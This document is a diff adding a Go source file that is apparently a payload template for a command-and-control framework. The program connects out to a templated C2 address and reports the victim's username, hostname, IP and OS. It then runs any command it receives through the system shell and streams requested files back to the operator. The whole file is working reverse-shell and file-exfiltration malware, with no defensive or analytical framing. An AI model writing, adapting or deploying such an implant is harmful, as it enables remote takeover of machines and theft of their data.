@@ -1,0 +1,198 @@
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"io"
+	"log"
+	"net"
+	"os"
+	"os/exec"
+	"os/user"
+	"runtime"
+	"strings"
+)
+
+func GetOutboundIP() string {
+	conn, err := net.Dial("udp", "8.8.8.8:80")
+	if err != nil {
+		return "N/A"
+	}
+	defer conn.Close()
+	localAddr := conn.LocalAddr().(*net.UDPAddr)
+	return localAddr.IP.String()
+}
+
+func sendMetadata(conn net.Conn) {
+	// Get system info
+	u, _ := user.Current()
+	hostname, _ := os.Hostname()
+	ip := GetOutboundIP()
+
+	// Ensure username and hostname have default values if empty
+	username := u.Username
+	if username == "" {
+		username = "unknown"
+	}
+	
+	if hostname == "" {
+		hostname = "unknown"
+	}
+
+	// Old verbose format (keeping it for compatibility)
+	msg := "[+] Golang payload:\n" +
+		"\t- Username: " + username + "\n" +
+		"\t- Hostname: " + hostname + "\n" +
+		"\t- LocalIP: " + ip + "\n" +
+		"\t- OS: " + runtime.GOOS + "\n"
+
+	conn.Write([]byte(msg + "\n"))
+}
+
+func executeCommand(command string) string {
+	// Special handling for metadata request
+	if command == "METADATA" {
+		u, _ := user.Current()
+		hostname, _ := os.Hostname()
+		
+		// Ensure username and hostname have default values if empty
+		username := u.Username
+		if username == "" {
+			username = "unknown"
+		}
+		
+		if hostname == "" {
+			hostname = "unknown"
+		}
+		
+		return username + "|" + hostname + "|" + runtime.GOOS + "|Golang"
+	}
+
+	var cmd *exec.Cmd
+
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/C", command)
+	} else {
+		cmd = exec.Command("sh", "-c", command)
+	}
+
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return "[Error] " + err.Error() + "\n" + string(output)
+	}
+	return string(output)
+}
+
+func handleDownloadCommand(conn net.Conn, filePath string) {
+	// Vérifier d'abord si le fichier existe
+	fileInfo, err := os.Stat(filePath)
+	if err != nil {
+		// Le fichier n'existe pas ou n'est pas accessible
+		fmt.Fprintf(conn, "ERROR: %s\n", err.Error())
+		return
+	}
+
+	// Vérifier qu'il s'agit bien d'un fichier régulier
+	if fileInfo.IsDir() {
+		fmt.Fprintf(conn, "ERROR: %s is a directory\n", filePath)
+		return
+	}
+
+	// Envoyer la taille du fichier
+	fileSize := fileInfo.Size()
+	fmt.Fprintf(conn, "FILE_SIZE: %d\n", fileSize)
+
+	// Ouvrir le fichier
+	file, err := os.Open(filePath)
+	if err != nil {
+		fmt.Fprintf(conn, "ERROR: Failed to open file: %s\n", err.Error())
+		return
+	}
+	defer file.Close()
+
+	// Lire le fichier et l'envoyer
+	buffer := make([]byte, 4096)
+	bytesRead := int64(0)
+
+	for bytesRead < fileSize {
+		n, err := file.Read(buffer)
+		if err != nil && err != io.EOF {
+			break
+		}
+		if n == 0 {
+			break
+		}
+
+		// Envoyer le bloc de données
+		_, err = conn.Write(buffer[:n])
+		if err != nil {
+			break
+		}
+		bytesRead += int64(n)
+	}
+}
+
+func handleCommands(conn net.Conn) {
+	reader := bufio.NewReader(conn)
+	
+	for {
+		// Lire la commande
+		command, err := reader.ReadString('\n')
+		if err != nil {
+			log.Printf("Error reading command: %s", err)
+			return
+		}
+		
+		// Nettoyer la commande
+		command = strings.TrimSpace(command)
+		
+		// Traiter la commande METADATA
+		if command == "METADATA" {
+			hostname, _ := os.Hostname()
+			username := getUsername()
+			osInfo := runtime.GOOS
+			
+			// Format: Username|Hostname|OS|PayloadType
+			metadata := fmt.Sprintf("%s|%s|%s|Golang", username, hostname, osInfo)
+			fmt.Fprintln(conn, metadata)
+			continue
+		}
+		
+		// Traiter la commande DOWNLOAD
+		if strings.HasPrefix(command, "DOWNLOAD ") {
+			filePath := strings.TrimPrefix(command, "DOWNLOAD ")
+			handleDownloadCommand(conn, filePath)
+			continue
+		}
+		
+		// Exécuter comme commande système
+		output := executeCommand(command)
+		fmt.Fprintln(conn, output)
+	}
+}
+
+func getUsername() string {
+	u, err := user.Current()
+	if err != nil {
+		return "unknown"
+	}
+	if u.Username == "" {
+		return "unknown"
+	}
+	return u.Username
+}
+
+func main() {
+	// Connect to the C2 server
+	conn, err := net.Dial("tcp", "{{TARGET_IP}}:{{TARGET_PORT}}")
+	if err != nil {
+		log.Fatal("Connexion échouée :", err)
+	}
+	defer conn.Close()
+
+	// Send initial metadata
+	sendMetadata(conn)
+	
+	// Handle commands
+	handleCommands(conn)
+}
